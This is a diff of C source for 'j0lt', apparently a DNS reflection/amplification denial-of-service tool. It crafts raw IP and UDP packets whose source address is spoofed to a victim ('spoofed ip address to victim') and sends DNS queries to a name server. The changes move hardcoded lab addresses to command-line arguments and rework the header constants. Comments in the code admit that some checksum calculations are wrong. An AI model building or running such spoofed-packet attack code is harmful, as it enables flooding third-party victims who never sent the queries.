@@ -4,9 +4,11 @@
 *
 * For reading:
 * https://datatracker.ietf.org/doc/html/rfc1700 (NUMBERS)
+* https://datatracker.ietf.org/doc/html/rfc1035 (DNS)
+* https://datatracker.ietf.org/doc/html/rfc1071 (CHECKSUM)
 * https://www.rfc-editor.org/rfc/rfc768.html (UDP)
 * https://www.rfc-editor.org/rfc/rfc760 (IP)
-*
+* 
 * For testing:
 * use ctrl + ` to bring up a terminal then $ unshare -rn. This will give you suid to test this
 * sudo tcpdump -X -n udp port 53
@@ -34,8 +36,6 @@
 
 #include <netdb.h>
 #include <unistd.h>
-
-#define DEBUG 1
 
 typedef struct __attribute__((packed, aligned(1)))
 {
@@ -107,22 +107,49 @@ DEFINE_INSERT_FN(dword, uint32_t)
 DEFINE_INSERT_FN(qword, uint64_t)
 #undef DEFINE_INSERT_FN
 
-#define     IPVER 4
-#define     IHL_MIN 5
-#define     IHL_MAX 15
-#define     ID 0x1337
-#define     QR 0 // query (0),
-#define     AA 0 // Authoritative Answer
-#define     TC 0 // TrunCation
-#define     RD 1 // Recursion Desired   (END OF BYTE 3)
-#define     RA 0 // Recursion Available
-#define     Z  0 // Reserved
-#define     AD 1 // Authentic Data (DNS-SEC)
-#define     CD 0 // Checking Disabled (DNS-SEC)
-#define     QDCOUNT 1 // num entry question
-#define     ANCOUNT 0 // num RR answer
-#define     NSCOUNT 0 // num NS RR 
-#define     ARCOUNT 0 // num RR additional
+// IP HEADER VALUES
+#define     IP_IHL_MIN_J0LT 5
+#define     IP_IHL_MAX_J0LT 15
+#define     IP_TTL_J0LT 0x40
+#define     IP_ID_J0LT 0x0dcf
+// FLAGS
+#define     IP_RF_J0LT 0x8000 // reserved fragment flag
+#define     IP_DF_J0LT 0x4000 // dont fragment flag
+#define     IP_MF_J0LT 0x2000 // more fragments flag
+// END FLAGS
+#define     IP_VER_J0LT 4
+// END IPHEADER VALUES 
+
+// DNS HEADER VALUES 
+#define 	DNS_ID_J0LT 0x1337
+#define 	DNS_QR_J0LT 0 // query (0), response (1).
+// OPCODE VALS 
+#define 	DNS_OP_QUERY_J0LT  0 // standard query (QUERY)
+#define 	DNS_OP_IQUERY_J0LT 1 // inverse query (IQUERY)
+#define 	DNS_OP_STATUS_J0LT 2 // server status (STATUS)
+#define 	DNS_OPCODE_J0LT DNS_OP_QUERY_J0LT
+// END OPCODE
+#define 	DNS_AA_J0LT 0 // Authoritative Answer
+#define 	DNS_TC_J0LT 0 // TrunCation
+#define 	DNS_RD_J0LT 0 // Recursion Desired 
+#define 	DNS_RA_J0LT 0 // Recursion Available
+#define 	DNS_Z_J0LT 0 // Reserved
+#define 	DNS_AD_J0LT 0 // dns sec
+#define 	DNS_CD_J0LT 0 // dns sec
+// RCODE
+#define 	DNS_RC_NO_ER_J0LT   0
+#define 	DNS_RC_FMT_ERR_J0LT 1
+#define 	DNS_RC_SRVR_FA_J0LT 2
+#define 	DNS_RC_NAME_ER_J0LT 3
+#define 	DNS_RC_NOT_IMP_J0LT 4
+#define 	DNS_RC_REFUSED_J0LT 5
+#define 	DNS_RCODE_J0LT DNS_RC_NO_ER_J0LT
+// END RCODE
+#define 	DNS_QDCOUNT_J0LT 0x0001 // num entry question
+#define 	DNS_ANCOUNT_J0LT 0x0000 // num RR answer
+#define 	DNS_NSCOUNT_J0LT 0x0000 // num NS RR 
+#define     DNS_ARCOUNT_J0LT 0x0000 // num RR additional
+// END HEADER VALUES
 
 const char* g_ansi = {
     " Usage: sudo ./j0lt [OPTION]...          \n"
@@ -159,6 +186,7 @@ insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len);
 uint16_t
 checksum(const uint16_t* addr, size_t count);
 
+#define DEBUG 1
 int
 main(int argc, char** argv)
 {
@@ -189,9 +217,9 @@ main(int argc, char** argv)
 #endif
 
     destip = argv[ 1 ];
-    destport = argv[ 2 ];
+    destport = argv[ 4 ];
     sourceip = argv[ 3 ];
-    sourceport = argv[ 4 ];
+    sourceport = argv[ 2 ];
 
     buflen = NS_PACKETSZ;
     memset(pktbuf, 0, NS_PACKETSZ);
@@ -200,7 +228,7 @@ main(int argc, char** argv)
     status = true;
     pack_dnshdr(&dnsheader, ns_o_query, ns_r_noerror);
     status &= insert_dns_header(&curpos, &buflen, &dnsheader);
-    status &= insert_dns_question(( void** ) &curpos, &buflen, "google.com", ns_t_any, ns_c_any);
+    status &= insert_dns_question(( void** ) &curpos, &buflen, "google.com", ns_t_a, ns_c_in);
     if (status == false)
         goto fail_close;
 
@@ -252,14 +280,15 @@ void
 pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* destip, const char* sourceip, size_t nwritten, size_t udpsz)
 {
     memset(iphdr, 0, sizeof(IPHEADER));
-    iphdr->version = IPVER;
-    iphdr->ihl = IHL_MIN;
-    iphdr->tot_len = 0x4f; // (iphdr->ihl << 2) + udpsz + nwritten;
-    iphdr->id = 0xc47e; //ID;
-    iphdr->ttl = 0x40; //0xff;
+    iphdr->version = IP_VER_J0LT;
+    iphdr->ihl = IP_IHL_MIN_J0LT;
+    iphdr->tot_len = (iphdr->ihl << 2) + udpsz + nwritten;
+    iphdr->id = IP_ID_J0LT;
+    iphdr->frag_off = IP_DF_J0LT;
+    iphdr->ttl = IP_TTL_J0LT;
     iphdr->protocol = getprotobyname("udp")->p_proto;
-    iphdr->saddr = htonl(inet_addr("10.137.0.16")); // htonl(inet_addr(sourceip)); // spoofed ip address to victim
-    iphdr->daddr = htonl(inet_addr("10.139.1.1"));// htonl(inet_addr(destip)); // name server 
+    iphdr->saddr = htonl(inet_addr(sourceip)); // spoofed ip address to victim
+    iphdr->daddr = htonl(inet_addr(destip));   // name server 
 
     memset(pseudohdr, 0, sizeof(PSEUDOHDR));
     pseudohdr->protocol = iphdr->protocol;
@@ -285,6 +314,8 @@ pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, const char* dport, const ch
     udphdr->uh_dport = dport_uint16; // nameserver port
     udphdr->uh_sport = sport_uint16; // victim port
     udphdr->uh_ulen = nwritten + sizeof(UDPHEADER);
+
+    // NOTE: this value should be pseudohdr->udplen = sizeof(UDPHEADER)
     pseudohdr->udplen = udphdr->uh_ulen;
 }
 
@@ -292,29 +323,23 @@ void
 pack_dnshdr(DNSHEADER* dnshdr, uint8_t opcode, uint8_t rcode)
 {
     memset(dnshdr, 0, sizeof(DNSHEADER));
-    dnshdr->id = ID;
-    dnshdr->rd = RD;
-    dnshdr->tc = TC;
-    dnshdr->aa = AA;
-    dnshdr->opcode = opcode;
-    dnshdr->qr = QR;
-    dnshdr->rcode = rcode;
-    dnshdr->cd = CD;
-    dnshdr->ad = AD;
-    dnshdr->unused = Z;
-    dnshdr->ra = RA;
-    dnshdr->qdcount = QDCOUNT;
-    dnshdr->ancount = ANCOUNT;
-    dnshdr->nscount = NSCOUNT;
-    dnshdr->arcount = ARCOUNT;
+    dnshdr->id = DNS_ID_J0LT;
+    dnshdr->rd = DNS_RD_J0LT;
+    dnshdr->tc = DNS_TC_J0LT;
+    dnshdr->aa = DNS_AA_J0LT;
+    dnshdr->opcode = DNS_OPCODE_J0LT;
+    dnshdr->qr = DNS_QR_J0LT;
+    dnshdr->rcode = DNS_RCODE_J0LT;
+    dnshdr->cd = DNS_CD_J0LT;
+    dnshdr->ad = DNS_AD_J0LT;
+    dnshdr->unused = DNS_Z_J0LT;
+    dnshdr->ra = DNS_RA_J0LT;
+    dnshdr->qdcount = DNS_QDCOUNT_J0LT;
+    dnshdr->ancount = DNS_ANCOUNT_J0LT;
+    dnshdr->nscount = DNS_NSCOUNT_J0LT;
+    dnshdr->arcount = DNS_ARCOUNT_J0LT;
 }
-/*
- * 	0x0000:  4500 004f c47e 0000 4011 9ffb 0a89 0010  E..O.~..@.......
- *	0x0010:  0a8b 0101 9955 0035 003b 1671 514e 0120  .....U.5.;.qQN..
- *	0x0020:  0001 0000 0000 0001 0667 6f6f 676c 6503  .........google.
- *	0x0030:  636f 6d00 0001 0001 0000 2910 0000 0000  com.......).....
- *	0x0040:  0000 0c00 0a00 085f 2870 ddb8 d601 89    ......._(p.....
- */
+
 bool
 insert_ip_header(uint8_t** buf, size_t* buflen, IPHEADER* header)
 {
@@ -356,7 +381,6 @@ insert_udp_header(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* p
     status &= insert_word(buf, buflen, header->uh_dport);
     status &= insert_word(buf, buflen, header->uh_sport);
     status &= insert_word(buf, buflen, header->uh_ulen);
-    status &= insert_word(buf, buflen, header->uh_sum);
 
     insert_dword(&pseudoptr, &i, pseudoheader->sourceaddr);
     insert_dword(&pseudoptr, &i, pseudoheader->destaddr);
@@ -365,6 +389,11 @@ insert_udp_header(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* p
     insert_word(&pseudoptr, &i, pseudoheader->udplen);
 
     header->uh_sum = checksum(( const uint16_t* ) pseudo, 12);
+
+    // IP4 UDP checksums are ignored. 
+    // NOTE: this is not the correct calculation for this value.
+    header->uh_sum = ~header->uh_sum;
+    status &= insert_word(buf, buflen, header->uh_sum);
 
     return status;
 }
@@ -450,13 +479,6 @@ insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len)
 
     return true;
 }
-/*
- * 	0x0000:  4500 004f c47e 0000 4011 9ffb 0a89 0010  E..O.~..@.......
- *	0x0010:  0a8b 0101 9955 0035 003b 1671 514e 0120  .....U.5.;.qQN..
- *	0x0020:  0001 0000 0000 0001 0667 6f6f 676c 6503  .........google.
- *	0x0030:  636f 6d00 0001 0001 0000 2910 0000 0000  com.......).....
- *	0x0040:  0000 0c00 0a00 085f 2870 ddb8 d601 89    ......._(p.....
- */
 
 uint16_t
 checksum(const uint16_t* addr, size_t count)
